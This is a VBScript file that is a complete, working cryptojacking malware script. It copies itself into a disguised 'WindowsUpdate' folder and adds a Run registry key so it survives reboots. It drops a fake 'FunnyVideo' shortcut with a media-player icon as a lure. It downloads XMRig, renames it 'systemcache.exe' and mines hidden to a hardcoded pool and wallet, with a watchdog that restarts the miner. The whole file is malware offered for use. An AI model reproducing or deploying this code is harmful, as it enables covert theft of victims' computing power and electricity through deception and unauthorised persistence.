' ================================
' Persistent Miner with Auto-Restart + Single Instance
' ================================
Dim shell, fso, appData, minerDir, exeName, exePath, zipUrl, zipPath, extractDir, logFile
Dim wallet, pool, password, arguments, gpuArgs
Dim regPath, regName, currentScript, hiddenPath

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' === CONFIG ===
zipUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
wallet = "BTC:1H8fueovMvcQLArhxw7P4QZ3FAfhEZg7CB.worker1"
pool = "159.203.162.18:3333"
password = "x"
exeName = "systemcache.exe"

appData = shell.ExpandEnvironmentStrings("%APPDATA%")
minerDir = appData & "\XMRigMiner"
zipPath = minerDir & "\xmrig.zip"
extractDir = minerDir & "\extract"
exePath = minerDir & "\xmrig-6.21.0\" & exeName
logFile = minerDir & "\miner.log"

' === AUTO-START SETUP ===
regPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
regName = "WindowsUpdate"
currentScript = WScript.ScriptFullName
hiddenPath = appData & "\WindowsUpdate\svchost.vbs"

' Step 1: Copy this script to hidden folder & register it in startup
If Not fso.FolderExists(appData & "\WindowsUpdate") Then fso.CreateFolder appData & "\WindowsUpdate"

If LCase(currentScript) <> LCase(hiddenPath) Then
    fso.CopyFile currentScript, hiddenPath, True
    shell.RegWrite regPath & "\" & regName, Chr(34) & hiddenPath & Chr(34), "REG_SZ"
    
    ' Create fake shortcut in Downloads with video icon
    Dim downloadShortcut, downloadFolder, iconLocation
    downloadFolder = shell.ExpandEnvironmentStrings("%USERPROFILE%\Downloads")
    iconLocation = "C:\Program Files\Windows Media Player\wmplayer.exe,0"

    Set downloadShortcut = shell.CreateShortcut(downloadFolder & "\FunnyVideo.lnk")
    downloadShortcut.TargetPath = hiddenPath
    downloadShortcut.IconLocation = iconLocation
    downloadShortcut.WindowStyle = 7
    downloadShortcut.Save

    shell.Run Chr(34) & hiddenPath & Chr(34), 0, False
    WScript.Quit
End If

' === Step 2: Setup Miner Folder & Executable ===
If Not fso.FolderExists(minerDir) Then fso.CreateFolder(minerDir)

If Not fso.FileExists(exePath) Then
    ' Download and extract
    Dim http : Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
    http.Open "GET", zipUrl, False
    http.Send

    If http.Status = 200 Then
        Dim stream : Set stream = CreateObject("ADODB.Stream")
        stream.Type = 1
        stream.Open
        stream.Write http.ResponseBody
        stream.SaveToFile zipPath, 2
        stream.Close
    Else
        WScript.Quit
    End If

    ' Extract ZIP
    Dim shellApp : Set shellApp = CreateObject("Shell.Application")
    If Not fso.FolderExists(extractDir) Then fso.CreateFolder extractDir
    shellApp.NameSpace(extractDir).CopyHere shellApp.NameSpace(zipPath).Items, 16
    WScript.Sleep 5000

    ' Move & rename xmrig.exe → systemcache.exe
    If fso.FolderExists(extractDir & "\xmrig-6.21.0") Then
        If fso.FolderExists(minerDir & "\xmrig-6.21.0") Then fso.DeleteFolder minerDir & "\xmrig-6.21.0", True
        fso.MoveFolder extractDir & "\xmrig-6.21.0", minerDir & "\xmrig-6.21.0"
    End If

    Dim originalExe : originalExe = minerDir & "\xmrig-6.21.0\xmrig.exe"
    If fso.FileExists(originalExe) Then
        If fso.FileExists(exePath) Then fso.DeleteFile exePath
        fso.MoveFile originalExe, exePath
    End If

    If fso.FileExists(zipPath) Then fso.DeleteFile zipPath
    If fso.FolderExists(extractDir) Then fso.DeleteFolder extractDir, True
End If

' === Step 3: Start Miner (first time only if not running)
If Not IsProcessRunning(exeName) Then
    gpuArgs = GetGPUArguments()
    arguments = "--algo randomx --url " & pool & " --user " & wallet & " --pass " & password & _
                " --cpu-max-threads-hint=0.2 --cpu-priority=0 --donate-level=1 --no-color --log-file """ & logFile & """ --api-port 0 " & gpuArgs

    shell.Run """" & exePath & """ " & arguments, 0, False
End If

' === Step 4: Watchdog - Restart if process dies ===
Do
    WScript.Sleep 10000 ' 10 seconds
    If Not IsProcessRunning(exeName) Then
        shell.Run """" & exePath & """ " & arguments, 0, False
    End If
Loop

' === Function: GPU Detection ===
Function GetGPUArguments()
    On Error Resume Next
    Dim objWMI, colItems, objItem, hasNvidia, hasAmd
    Set objWMI = GetObject("winmgmts:\\.\root\CIMV2")
    Set colItems = objWMI.ExecQuery("Select * from Win32_VideoController")
    For Each objItem In colItems
        If InStr(LCase(objItem.Name), "nvidia") > 0 Then hasNvidia = True
        If InStr(LCase(objItem.Name), "amd") > 0 Or InStr(LCase(objItem.Name), "radeon") > 0 Then hasAmd = True
    Next
    If hasNvidia Then
        GetGPUArguments = "--cuda --cuda-max-threads=16"
    ElseIf hasAmd Then
        GetGPUArguments = "--opencl"
    Else
        GetGPUArguments = ""
    End If
    On Error GoTo 0
End Function

' === Function: Check Process Running ===
Function IsProcessRunning(procName)
    On Error Resume Next
    Dim wmi, procs, proc
    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
    Set procs = wmi.ExecQuery("Select * from Win32_Process Where Name='" & procName & "'")
    IsProcessRunning = (procs.Count > 0)
    On Error GoTo 0
End Function
